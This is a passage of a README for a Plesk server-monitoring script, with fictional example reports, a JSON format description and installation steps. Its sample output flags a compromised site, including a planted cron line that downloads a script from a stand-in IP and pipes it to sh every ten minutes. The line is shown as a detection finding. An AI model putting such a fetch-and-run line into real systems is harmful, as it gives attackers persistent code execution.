  203.0.113.10 → host.example.com: ok (forward-confirmed)
  Postfix HELO name: host.example.com (resolves to this server, matches PTR)
  IPv6: not used for mail (CHECK_IPV6=auto)
  DNS queried via 1.1.1.1

Mail server certificates for host.example.com:
  port 25: name ok, valid 61 more days
  port 465: name ok, valid 61 more days
  port 587: name ok, valid 61 more days
  port 993: name ok, valid 61 more days
  port 995: name ok, valid 61 more days

Mail authentication (SPF / DKIM / DMARC):
  nails.example                SPF pass      | DKIM MISSING  | DMARC missing      | MX here | DNS ns1.other-provider.example
  38 domain(s) OK, 1 with findings. Alert only if SPF and DKIM both fail and the MX points here;
  a single missing/outdated record is a recommendation (DMARC passes if SPF or DKIM passes).
  DNS queried via 1.1.1.1

Mailboxes (fill level of the size limit; warning from WARN_MAILBOX_PCT=95 %, without a limit from WARN_MAILBOX_UNLIMITED_GB=5 GB):
   91 %  office@lawfirm.example  (2.75 GB of 3.00 GB)
   84 %  jane@agency.example  (423 MB of 500 MB)
   78 %  info@salon.example  (809 MB of 1.00 GB)
   77 %  orders@shop.example  (779 MB of 1000 MB)
   64 %  info@shop.example  (1.07 GB of 1.56 GB)
  89 mailbox(es) checked; 19 unlimited (no size limit set in Plesk; largest: info@bakery.example 3.21 GB, all together 12.48 GB), 5 without maildirsize (not counted)

Mail forwarding to other providers (spam that is only marked is forwarded too):
  3 address(es) forward to other providers: 2 keep spam back (delete, or move with a copy kept), 1 forward it, 0 without spam filter
  - spam forwarded too: info@salon.example → gmail.com (spam marked)
  Recommendation: set the spam filter of these addresses to "Delete spam" (Plesk: Mail → address → Spam Filter,
  or: plesk bin spamassassin --update ADDRESS -action del) – or to "Move spam to the Spam folder" with copies
  kept in the mailbox. Marked spam is forwarded, and the receiving provider rates this server for it.
  Spam filter size limit: 5242880 bytes (5.0 MB)
  DNS blocklist for incoming mail: zen.spamhaus.org

########################
######## ACCESS ########
########################

== SUCCESSFUL LOGINS (SSH, Plesk panel) ==
     2× SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
     1× Plesk admin          from 198.51.100.200   (panel)  DE, Example Telekom AG

== PLESK PANEL: failed logins ==
Failed panel logins: 7
  login names: admin ×5, root ×2
  top IPs: 192.0.2.88 (US, Example Cloud Ltd [datacenter]) ×5, 203.0.113.70 (CN, Example Telecom) ×2

== FAIL2BAN ==
  plesk-courierimap            banned:   9 (total 87), currently failed: 136
  plesk-modsecurity            banned:  15 (total 612), currently failed: 31
  plesk-postfix                banned:   2 (total 221), currently failed: 174
  plesk-wordpress              banned:   0 (total 114), currently failed: 4
  recidive                     banned: 286 (total 561), currently failed: 242
  ssh                          banned:   5 (total 1251), currently failed: 20
  (jails without bans/failures hidden)
  Banned IPs with earlier successful logins (customer or own device with an outdated password?):
    plesk-courierimap: 198.51.100.77 (DE, Example Kabel GmbH) – earlier successful mail logins of office@lawfirm.example (last 2026-10-25); failed logins from there: iphone@oldname.example ×5 (no such mailbox)

== ACCESS & PERSISTENCE (SSH keys, accounts, sudo, cron, autostart, processes, ports, addresses) ==
SSH keys (authorized_keys): 2 key(s) of 1 account(s)
Accounts with a login shell: 2 | sudo group members: 1 | sudoers files: 1
Cron jobs: 38 entr(y/ies) | autostart files (cron.hourly…monthly, rc.local, systemd units in /etc): 17
  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
Processes: 284 checked, 0 suspicious (program in /tmp, /dev/shm or a web folder, deleted, memory only, fake kernel thread)
Listening TCP ports (not loopback): 21 xinetd, 22 sshd, 25 master, 53 named, 80 nginx, 110 couriertcpd, 143 couriertcpd, 443 nginx, 465 master, 587 master, 993 couriertcpd, 995 couriertcpd, 8443 sw-cp-serverd, 8880 sw-cp-serverd
IP addresses (global): 203.0.113.10 (eth0)

== ACCESS – daily checks (as of 2026-10-26 01:05 UTC) ==
Reachable from outside (databases, Plesk installer) – firewall rules in the kernel (iptables):
  MySQL/MariaDB (3306): listens only locally (127.0.0.1) – not reachable from outside
  PostgreSQL (5432): not listening
  Plesk installer (8447, runs only while used): the firewall allows it only from 198.51.100.7
  (a firewall in front of the server, e.g. at the hosting provider, is not visible from here)

SSH access of Plesk system users (group psacln, 31 accounts):
  locked in their web space (chrooted): 29 | full shell: 1 | no SSH (Forbidden, /bin/false, nologin): 1
  of the 30 with a shell: SFTP only (ForceCommand): 29
  full shell: deputy (/bin/bash) – allowed (ALLOWED_FULL_SHELL_USERS)
  keys of deputy: /etc/ssh/authorized_keys/deputy – not changeable by deputy

#####################
######## WEB ########
#####################

== WEB (since last run) ==
requests | 5xx | login POSTs | domain | busiest IP
      562     2      0  shop.example  198.51.100.30 (472)
      310    51      0  blog.example  192.0.2.80 (40)
      188     0    122  agency.example  203.0.113.150 (160)
       95     0      0  lawfirm.example  198.51.100.12 (23)

WordPress login attacks (domains with at least 20 login POSTs):
  agency.example: 122 POSTs from 54 IPs (busiest 203.0.113.150 (20))
    wp-login.php: 80, successful (302): 1 | xmlrpc.php: 42, blocked (4xx): 0 – xmlrpc.php is NOT blocked
    successful wp-login from: 198.51.100.200 (DE, Example Telekom AG), 0 failures before

PHP fatal errors (count, domain, first message):
     48  blog.example – Uncaught Error: Call to undefined function create_function() in /var/www/vhosts/blog.example/httpdocs/wp-content/plugins/old-slider/slider.php:12

Attack patterns & sensitive-file probes (count, of which answered 200):
  shop.example               SQLi 14/0 | traversal 6/0 | code exec 3/0 | XSS 2/0 | sensitive files 41/1
      served with 200 AND present on disk: /.env
  blog.example               SQLi 0/0 | traversal 2/0 | code exec 0/0 | XSS 0/0 | sensitive files 17/0

Traffic peaks & distributed requests (busiest minute; URL requested by most different IPs):
  agency.example             peak 212 req/min at 04:07 | /wp-login.php from 54 IPs

ModSecurity (hits, of which blocked; top rules):
      31     29  shop.example – 942100 SQL Injection Attack Detected via libinjection ×18; 930120 OS File Access Attempt ×9

== WEBROOTS: PHP files in upload folders ==
New since last run: 2
  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/cache.php
  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/wp-tmp.php

== CERTIFICATE RENEWALS (Let's Encrypt, from the Plesk panel log) ==
Failed automatic certificate renewals (Let's Encrypt):
  none

== WEB – daily checks (as of 2026-10-26 01:05 UTC) ==
TLS certificates:
  all valid certificates are good for at least 14 more days
  no matching certificate (e.g. no SSL, mail-only, redirect): mail-only.example parked.example

HTTPS (HSTS and http→https redirect; domains with a valid certificate that point here):
  no HSTS: lawfirm.example
  no redirect from http to https: lawfirm.example
  security can be improved (Plesk: Websites & Domains → SSL/TLS Certificates → HSTS / Redirect from http to https)
  23 domain(s) checked
  DNS queried via 1.1.1.1

Domain DNS (points here? CAA, DNSSEC, domain blocklists):
  moved.example: website points elsewhere (192.0.2.77, NL, Example Hosting B.V. [datacenter]) – moved? CDN?
  39 domain(s) checked, findings listed above
  DNS queried via 1.1.1.1, domain blocklists via 127.0.0.1

Exposed files in document roots (.env, .git, dumps, backups, config copies, info/admin tools):
  shop.example/.env – PUBLICLY REACHABLE (HTTP 200)
  shop.example: 1 file(s) found but blocked by the web server (HTTP 403), e.g. /.git/
  42 document root(s) scanned, 2 finding(s); only publicly reachable ones raise an alert
  This list is from the daily check (see "as of" in the heading) and repeats until the next one. After fixing a file, check again right away: plesk-server-report.sh --only exposed – or rm /var/lib/plesk-server-report/daily_date to refresh the daily checks in the next run

Suspicious code in recently changed PHP files, .htaccess and .user.ini (typical webshell/backdoor patterns):
  42 document root(s) scanned, 0 suspicious file(s)

########################
######## SYSTEM ########
########################

== LOAD, CPU, RAM, FILESYSTEMS ==
Load: 0.42 / 0.37 / 0.30 (1/5/15 min) on 8 cores | up 12 days, 4 hours, 10 minutes
%Cpu(s):  3.1 us,  1.0 sy,  0.0 ni, 95.6 id,  0.2 wa,  0.0 hi,  0.1 si,  0.0 st

CPU per system user (snapshot):
    12.9 %  shopexample
     4.2 %  mysql
     2.1 %  root

Top processes:
    8.6 %  shopexample  php-fpm
    4.2 %  mysql        mariadbd
    4.3 %  shopexample  php-fpm
    1.3 %  root         fail2ban-server

RAM: 11240 of 16000 MB available (70 %) | swap used: 0/2047 MB

Filesystems (space used, inodes used):
   41%  /  (inodes 6%)
    8%  /boot/efi

== SERVICES ==
Failed units: none
OOM killer: none
Crashes: none

== BACKUPS ==
Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
Acronis agent: running

== SYSTEM – daily checks (as of 2026-10-26 01:05 UTC) ==
Updates available: 11, security updates: 3
  libssl3t64
  openssl
  openssh-server
nginx running (version, package):
  websites: nginx/1.30.7 – /usr/sbin/nginx, package sw-nginx 1.30.7-v.debian.13+p18.0.75.0 (Plesk)
  the Plesk panel (sw-cp-server): nginx/1.30.7 – /usr/sbin/sw-cp-serverd, package sw-cp-server 2:1.30.7-v.debian.13+p18.0.75.0 (Plesk)
Script version: 1.22.0 (latest release)

Kernel modules of rarely used network protocols: sctp blocked, dccp blocked, tipc blocked, rds not installed

PHP versions (security support per https://www.php.net; domains with PHP: 36):
  8.3 (8.3.37) – no domain, but the default of 2 service plan(s): Unlimited (reseller reseller1), Default Domain (reseller reseller2) – supported until 2027-12-31 (php.net)
  8.4 (8.4.28) – 35 domain(s), supported until 2028-12-31 (php.net)
  8.5 (8.5.13) – 1 domain(s), supported until 2029-12-31 (php.net)

rc.local: not used (/etc/rc.local doesn't exist)

Daily checks took 3 min 12 s (slowest: domaindns 71 s, https 48 s, exposed 22 s)

IP geolocation: DB-IP.com Lite databases (CC BY 4.0)
```

The report above is what a hijacked mailbox and a hacked WordPress site look like: one mailbox, read via IMAP from a Brazilian datacenter for the first time and used from twelve different IPs, suddenly sends 140 mails to 700 recipients pretending to be a bank. Gmail, Microsoft and Apple start throttling and rejecting the server's mail – for every customer on it. Two PHP files show up in the uploads folder of the same customer, a new cron job of that site downloads and runs a script every ten minutes – deleting the PHP files alone would not stop it – and that site's `.env` file with its database password can be downloaded by anyone. The second IMAP line (Spain) raises no alert: that mailbox has been seen there before, someone on holiday.

<details>
<summary><b>Example <code>summary.txt</code></b> (the same day, condensed from all reports of the last 24 hours – 24 with the hourly cron job, 12 if it runs every 2 hours; fictional data, shortened)</summary>

```
Server summary host.example.com – last 24 h: 24 report(s), 2026-10-25 11:05 UTC to 2026-10-26 10:05 UTC – plesk-server-report v1.22.0
Built from the reports of this period, in their themes: MAIL, ACCESS, WEB, SYSTEM – totals and peaks of the hourly checks, and the newest results of the daily checks. Details of a run: report-<date>-<time>.txt

== RUNS (time, status) ==
  2026-10-25 11:05 UTC  STATUS: OK
  2026-10-25 12:05 UTC  STATUS: OK
  …
  2026-10-26 00:05 UTC  STATUS: OK
  2026-10-26 01:05 UTC  STATUS: WARNING (2)
  …
  2026-10-26 09:05 UTC  STATUS: WARNING (5)
  2026-10-26 10:05 UTC  STATUS: WARNING (14)

== ALERTS (by theme, the critical ones first; times seen, first – last, text) ==
MAIL (7):
    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example used from 5 different IPs – password compromised?
    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example sent 23 mails with a foreign sender domain – spam?
    1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
    1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Mail: 61 rejections by remote servers mentioning a blocklist, reputation, spam or rate limit – check the server IP and the examples
    …
ACCESS (2):
    1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
    6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)); failed logins from there: iphone@oldname.example ×5 (no such mailbox) – a device still set up for a mailbox that doesn't exist (any more)? Remove that account from the device. Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
WEB (4):
   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
    …
SYSTEM (1):
   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Updates: 3 security update(s) pending

######################
######## MAIL ########
######################

== MAIL: delivery & spam filter (totals) ==
Delivered: 2276 | deferred: 91 | bounced: 36 | highest queue: 4 (2026-10-26 10:05 UTC)
Rejections mentioning blocklist/reputation/spam/rate limit: 61
  example (2026-10-26 10:05 UTC): Oct 26 09:41:12 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 [203.0.113.10] Gmail has detected an unusual rate of unsolicited mail …
  example (2026-10-26 10:05 UTC): Oct 26 09:44:03 outlook.com: host outlook-com.olc.protection.outlook.com[192.0.2.40] said: 451 4.7.650 The mail server [203.0.113.10] has been temporarily rate limited …
Rejections of forwarded mail: 7 (forwarding here, sender rewritten with SRS – not sent by a customer, but counts against this server IP)
  mobil@lawfirm.example → jane.doe@gmail.com: 7 rejected (original sender: spam-sender.example)
  example, forwarded (2026-10-26 08:05 UTC): Oct 26 08:12:40 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 Gmail has detected an unusual rate of mail originating from your DKIM …
Outgoing deliveries per receiving mail server (provider or MX host; total sent / deferred attempts (mails) / bounced):
  google                  1104 / 53 (10 mails) / 19
  microsoft                512 / 31 (8 mails) / 11
  gmx/web.de/ionos         301 / 1 (1 mail) / 2
  t-online                  88 / 0 / 0
  apple icloud              41 / 6 / 4
  mailhost.example          37 / 0 / 0
Watched recipient domain invoices.example.com: 21 sent, 0 deferred, 0 bounced
Full mailboxes (rejected delivery attempts in total, first – last):
       7  info@salon.example  2026-10-25 23:05 UTC – 2026-10-26 07:05 UTC
Spam filter: all mails scanned (limit 3.0 MB = 3145728 bytes)
DNS blocklists for the server IP: not listed in any run

== MAIL: senders & logins (totals) ==
Authenticated mailboxes (mails in total; every client IP seen):
     163  info@shop.example
          198.51.100.4 (DE, Example Telekom AG) ×3
          192.0.2.15 (BR, Example Cloud Ltd [datacenter]) ×12, 203.0.113.99 (VN, Example Telecom) ×8, …
          192.0.2.15 (BR, Example Cloud Ltd [datacenter]) ×61, 203.0.113.99 (VN, Example Telecom) ×40, …
      87  office@agency.example
          198.51.100.20 (DE, Example Telekom AG) ×87

IMAP/POP3 logins from outside the allowed countries (time; logins, mailbox, IP):
  2026-10-26 09:05 UTC  9  info@shop.example  from 192.0.2.15 (BR, Example Cloud Ltd [datacenter])  – 48.3 MB of mail read  – first login from BR
  2026-10-26 10:05 UTC  14  info@shop.example  from 192.0.2.15 (BR, Example Cloud Ltd [datacenter])  – 2.1 MB of mail read
  …

Mailboxes sending with a foreign sender domain (login ≠ from):
  2026-10-26 09:05 UTC  23  info@shop.example – e.g. support@bank-secure.example
  2026-10-26 10:05 UTC  140  info@shop.example – e.g. support@bank-secure.example

== MAIL: failed logins (totals) ==
Failed mail logins: SMTP 1312 | IMAP/POP3 41 in total, most in one run: 118 (2026-10-26 03:05 UTC)
…

== MAIL – daily checks (as of 2026-10-26 01:05 UTC) ==
Mailboxes (fill level of the size limit; warning from WARN_MAILBOX_PCT=95 %, without a limit from WARN_MAILBOX_UNLIMITED_GB=5 GB):
   91 %  office@lawfirm.example  (2.75 GB of 3.00 GB)
   …

########################
######## ACCESS ########
########################

== SUCCESSFUL LOGINS (SSH, Plesk panel; count, first – last) ==
     9×  2026-10-25 14:05 UTC – 2026-10-26 10:05 UTC  SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
     2×  2026-10-26 08:05 UTC – 2026-10-26 10:05 UTC  Plesk admin          from 198.51.100.200   (panel)  DE, Example Telekom AG

== PLESK PANEL: failed logins (totals) ==
Failed panel logins: 61 in total, most in one run: 9 (2026-10-26 03:05 UTC)
  login names: admin ×44, root ×17
  top IPs: 192.0.2.88 (US, Example Cloud Ltd [datacenter]) ×31, 203.0.113.70 (CN, Example Telecom) ×12, …

== FAIL2BAN (per jail: banned now, total, failed now – newest report; most banned at once) ==
  plesk-courierimap            banned:   9 (total 87), currently failed: 136 | most banned: 14 (2026-10-26 05:05 UTC)
  recidive                     banned: 286 (total 561), currently failed: 242 | most banned: 286 (2026-10-26 10:05 UTC)
  ssh                          banned:   5 (total 1251), currently failed: 20 | most banned: 11 (2026-10-25 22:05 UTC)
  …
  Banned IPs with earlier successful logins (count, first – last):
     6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  plesk-courierimap: 198.51.100.77 (DE, Example Kabel GmbH) – earlier successful mail logins of office@lawfirm.example (last 2026-10-25); failed logins from there: iphone@oldname.example ×5 (no such mailbox)

== ACCESS & PERSISTENCE (changes + − ~ and findings !; count, first – last) ==
     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh

== ACCESS – daily checks (as of 2026-10-26 01:05 UTC) ==
Reachable from outside (databases, Plesk installer) – firewall rules in the kernel (iptables):
  MySQL/MariaDB (3306): listens only locally (127.0.0.1) – not reachable from outside
  …

#####################
######## WEB ########
#####################

== WEB (totals) ==
…

== WEBROOTS: PHP files in upload folders ==
New in this period: 2
  2026-10-26 10:05 UTC  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/cache.php
  2026-10-26 10:05 UTC  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/wp-tmp.php

== CERTIFICATE RENEWALS (failed Let's Encrypt renewals: count, domain, first – last, reason) ==
  none

== WEB – daily checks (as of 2026-10-26 01:05 UTC) ==
Exposed files in document roots (.env, .git, dumps, backups, config copies, info/admin tools):
  shop.example/.env – PUBLICLY REACHABLE (HTTP 200)
  …

########################
######## SYSTEM ########
########################

== LOAD, CPU, RAM, FILESYSTEMS ==
Highest 5-min load: 2.84 (2026-10-26 03:05 UTC) on 8 cores | lowest available RAM: 61 % (2026-10-26 03:05 UTC)
…

== SERVICES ==
Failed services / OOM killer / crashes: none in any run

== BACKUPS (newest report) ==
  Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
  Acronis agent: running

== SYSTEM – daily checks (as of 2026-10-26 01:05 UTC) ==
Updates available: 11, security updates: 3
  …
```

The summary shows what a single report can't: the first signs at 09:05 (the first IMAP login from Brazil, five IPs, 23 mails with a foreign sender), the escalation an hour later with the big providers throttling the server, and that the exposed `.env` had been reported since the daily check at 01:05.

</details>

### JSON report (optional, `JSON_REPORT=1`)

Besides the text report the script can write a machine-readable copy of every run: `report-YYYYMMDD-HHMM.json` next to the text report, the newest one also as `latest.json`, and next to `summary.txt` a `summary.json` (locally in `/var/lib/plesk-server-report/out` and in the upload). Every alert in them has a **severity** – `critical` or `warning`, see below. It was built for a later integration as a **Plesk extension** (a dashboard page in the panel – planned, no date yet), but it lets anyone build their own automated evaluation, graphs or alerting on top of the reports without parsing the text. It is **off by default**, and switching it on changes nothing in the text reports, `summary.txt` or the mails – the JSON is an extra file, built in the same run from the same alerts and lines (the tests check that the text is byte-identical with and without it). `--json` writes it for a single run; with `--only`, `--no-upload` or `--summary` the JSON is printed instead of the text, e.g. `plesk-server-report.sh --only system,mail --json`.

**While the Plesk extension is being developed, the format may still change.** If you build something on it, read the CHANGELOG before an update.

<details>
<summary><b>Example <code>report-YYYYMMDD-HHMM.json</code></b> and its fields (fictional data, shortened)</summary>

```json
{
  "schema": 1,
  "generator": "plesk-server-report",
  "version": "1.13.0",
  "host": "host.example.com",
  "time": "2026-11-14T10:05:00Z",
  "time_local": "2026-11-14 10:05 UTC",
  "only": null,
  "report": "report-20261114-1005.txt",
  "pseudonymised": false,
  "status": "warning",
  "level": "critical",
  "alerts": [
    {"check": "mail", "daily": false, "severity": "critical", "key": "5d02b6e1f3a49c87", "new": true, "text": "Mail: mailbox info@shop.example sent 23 mails with a foreign sender domain – spam?"},
    {"check": "mail", "daily": false, "severity": "warning", "key": "3f9c1a2b7d0e4c51", "new": true, "text": "Mail: 240 deferred deliveries"},
    {"check": "certificates", "daily": true, "severity": "warning", "key": "a71d0e44c2b9f013", "new": false, "text": "TLS: certificate of shop.example expires in 9 days"}
  ],
  "notes": [
    {"check": "panel", "text": "panel: /var/log/plesk/panel.log not found"}
  ],
  "metrics": {
    "load5": 1.42, "cpu_cores": 4, "mem_avail_pct": 38, "disk_max_pct": 71,
    "mail_delivered": 812, "mail_deferred": 240, "mail_queue": 12, "web_5xx": 31
  },
  "sections": [
    {"check": "mail", "daily": false, "title": "MAIL: delivery & spam filter", "lines": ["Delivered: 812 | deferred: 240 | bounced: 3 | queue: 12", "…"]}
  ],
  "daily_as_of": "2026-11-14 00:05 UTC",
  "geo": "DB-IP.com Lite databases (CC BY 4.0)"
}
```

| Field | Meaning |
|---|---|
| `schema` | format version. It only changes when a field changes its meaning or goes away; new fields don't change it – ignore fields you don't know. |
| `status` | `ok` or `warning`, as in the `STATUS:` line |
| `level` | `ok`, `warning`, or `critical` when at least one alert is critical |
| `alerts` | every alert of the text report, in the same order. `severity`: `critical` or `warning` (see *Severity* below). `check` is the check that raised it (names as in `--list`; `script` for the script's own alerts, `daily` for daily checks cached before `JSON_REPORT` was switched on). `daily`: from the daily checks. `key`: the alert without its figures – stable from run to run, for "new / known / gone". `new`: the key was not in any report of the last 24 hours. |
| `notes` | the ` i ` lines: missing or shortened data |
| `metrics` | figures for graphs over time: `load1`, `load5`, `load15`, `cpu_cores`, `mem_total_mb`, `mem_avail_mb`, `mem_avail_pct`, `disk_max_pct`, `inodes_max_pct`, `mail_delivered`, `mail_deferred`, `mail_bounced`, `mail_queue`, `mail_blocklist_rejections`, `mail_forwarded_rejections`, `mail_failed_logins_smtp`, `mail_failed_logins_imap`, `web_requests`, `web_5xx`, `web_login_posts`. A figure is missing (not 0) when its check did not run. |
| `sections` | the text of each check, line by line, exactly as in the text report, in the order of the report (by theme). `title` is its `== … ==` heading – a check with several headings (`mail`) gives one section per heading, all with the same `check` –, for a daily check its first line when that ends with a colon (e.g. `TLS certificates`); the title line is not repeated in `lines`. The theme headings (`######## MAIL ########`) and the headings of the daily blocks are not in it; the check tells the theme (see [Example report](#example-report-fictional-data)). |
| `pseudonymised` | `true` in the uploaded copy when `MASK_MAILBOXES=1` |

The text is cleaned like the text report (no control characters); bytes that are not UTF-8 are dropped.

</details>

<details>
<summary><b>Example <code>summary.json</code></b> and its fields (fictional data, shortened)</summary>

Built from the JSON reports of the last `SUMMARY_HOURS` (needs `SUMMARY=1`), like `summary.txt` from the text reports – the text summary doesn't change.

```json
{
  "schema": 1,
  "generator": "plesk-server-report",
  "version": "1.14.0",
  "host": "host.example.com",
  "time": "2026-11-14T10:06:12Z",
  "hours": 24,
  "pseudonymised": false,
  "reports": 12,
  "from": "2026-11-13T12:05:00Z",
  "to": "2026-11-14T10:05:00Z",
  "level": "critical",
  "runs": [
    {"time": "2026-11-13T12:05:00Z", "report": "report-20261113-1205.txt", "status": "ok", "level": "ok", "alerts": 0, "metrics": {"load5": 0.4, "mail_delivered": 310, "web_5xx": 2}},
    {"time": "2026-11-14T10:05:00Z", "report": "report-20261114-1005.txt", "status": "warning", "level": "critical", "alerts": 3, "metrics": {"load5": 1.42, "mail_delivered": 812, "web_5xx": 31}}
  ],
  "alerts": [
    {"check": "mail", "daily": false, "severity": "critical", "key": "5d02b6e1f3a49c87", "count": 2, "first": "2026-11-14T09:05:00Z", "last": "2026-11-14T10:05:00Z", "text": "Mail: mailbox info@shop.example sent 23 mails with a foreign sender domain – spam?"},
    {"check": "certificates", "daily": true, "severity": "warning", "key": "a71d0e44c2b9f013", "count": 12, "first": "2026-11-13T12:05:00Z", "last": "2026-11-14T10:05:00Z", "text": "TLS: certificate of shop.example expires in 9 days"}
  ]
}
```

| Field | Meaning |
|---|---|
| `reports`, `from`, `to` | number of JSON reports in the period, time of the first and the last |
| `level` | the worst `level` of the period |
| `runs` | every run, oldest first: time, its text report, `status`, `level`, number of alerts and all its `metrics` – for graphs and to spot gaps |
| `alerts` | every alert once (by `key`), critical ones first, then in the order they first appeared: how often (`count`) and when (`first`, `last`) it was seen; `text` from the newest report |

Reports written before 1.14.0 have no severity: their alerts count as `warning`.

</details>

#### Severity

Only in the JSON files – the text report doesn't show it. **`critical`** means: signs of a compromise or an outage, act now. Everything else is a **`warning`**: check it.

| Critical | Alerts (beginning of the text) |
|---|---|
| Outgoing spam, a hijacked account | `Mail: server IP … is listed on …`, `DNS: domain … is listed on …`, every alert ending in "password compromised?" or "password guessed?" (except a mailbox login from a new country – often a trip), `Mail: mailbox … with a foreign sender domain – spam?`, `Web: … brute force succeeded?` |
| Malware, backdoors, exposed secrets | `Web: … new PHP file(s) in wp-content/uploads`, `Web: suspicious …`, `Web: … served the sensitive file …`, `Web: … exposes … publicly`, `Login: SSH login as … – not meant for SSH: …`, `Access: new SSH key …`, `Access: account … has UID 0`, `Access: /etc/ld.so.preload …`, `Cron: … suspicious …`, `Process: …` |
| Outages | `Service(s) failed: …`, `Crash: …` of nginx or Apache, `fail2ban is not running`, `RAM: the kernel killed processes …`, `DNS: … does not resolve …`, `TLS: mail certificate on port … has expired` |

---

## Requirements

- Plesk Obsidian on Linux with Postfix and Dovecot or Courier for IMAP/POP3 – Plesk lets you choose; both log formats are recognized automatically (tested on Debian; Ubuntu should work the same; RHEL-based systems are partially supported: the daily check for pending OS updates uses `dnf` instead of `apt-get` and reports security updates only, SSH logins are read from `/var/log/secure`). The script itself is installed and updated with `curl` on every system, see [Quick start](#quick-start--no-configuration-needed).
- root access, `bash`, `awk`, `openssl`, `procps` (`top`, `free`) – all present on a standard Plesk server
- optional: `fail2ban` (Plesk component), `rclone` for the upload, `mmdblookup` for geolocation (see below)

---

## Installation

Two layouts, both fully supported: the usual Linux layout below, or [everything in one folder](#everything-in-one-folder).

```bash
# latest release (recommended)
curl -fsSL -o /usr/local/sbin/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
chmod 700 /usr/local/sbin/plesk-server-report.sh

# read it before you run it as root – or let an AI review it, see "Check it before you run it as root"
less /usr/local/sbin/plesk-server-report.sh

# optional, recommended: geolocation of login IPs
apt install mmdb-bin            # RHEL-based: dnf install libmaxminddb (EPEL)

# first test run: prints the report, uploads and mails nothing
/usr/local/sbin/plesk-server-report.sh --no-upload
```

Options: `--no-upload` (print instead of upload), `--only CHECK,…` (run single checks, see [First run](#first-run)), `--summary` (print the 24-hour summary from the stored reports), `--list` (check names), `--version`, `--self-update` (see [Updates](#updates)), `--config FILE`, `--init-config`, `--print-config` (see [Everything in one folder](#everything-in-one-folder)), `--help`.

**Releases or `main`?** The [releases](../../releases) are tested versions that have been running on the author's server for a while. `main` gets every change as soon as it is made. To follow `main`, use `https://raw.githubusercontent.com/cmelius/plesk-monitoring-server-Report/main/plesk-server-report.sh` instead. The first line of every report shows the version.

**Geolocation:** with `mmdblookup` installed, the script downloads the free [DB-IP Lite](https://db-ip.com/db/lite.php) country and ASN databases (a few MB each) on the first run into `/var/lib/plesk-server-report/geoip` and refreshes them once a month. This needs outbound HTTPS to `download.db-ip.com`. Lookups are done locally, so no IP address is sent to any service. Without `mmdblookup` the script works as before and says so at the end of the report. To get **alerts**, set your customers' countries (see [Configuration](#configuration)):

```bash
echo 'ALLOWED_COUNTRIES="DE AT CH"' >> /etc/plesk-server-report.conf
chmod 600 /etc/plesk-server-report.conf     # the script loads it as code: only root may write it
```

The **first run** reads the last 20,000 lines of each log and lists all existing PHP files in upload folders, so it may contain warnings about older events. Review them once (see [First run](#first-run)). From the second run on, only new lines are analysed.

Then set up the storage (next section) and the cron job:

```bash
echo '5 * * * * root /usr/local/sbin/plesk-server-report.sh' > /etc/cron.d/plesk-server-report
chmod 644 /etc/cron.d/plesk-server-report
```

### Everything in one folder

The layout above is the usual one on Linux: the script in `/usr/local/sbin`, its configuration in `/etc`, its state in `/var/lib`. If you'd rather keep everything in one folder that you can remove at once, put the script into a folder of its own, e.g. `/opt/plesk-server-report/`:

```bash
mkdir -p /opt/plesk-server-report && chmod 700 /opt/plesk-server-report
curl -fsSL -o /opt/plesk-server-report/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
chmod 700 /opt/plesk-server-report/plesk-server-report.sh
/opt/plesk-server-report/plesk-server-report.sh --no-upload
# cron: 5 * * * * root /opt/plesk-server-report/plesk-server-report.sh
```

How the script finds its files:
- **Configuration:** `plesk-server-report.conf` next to the script if it exists, else `/etc/plesk-server-report.conf`; `--config FILE` names another one. The same check applies to all of them: owned by root, writable only by root.
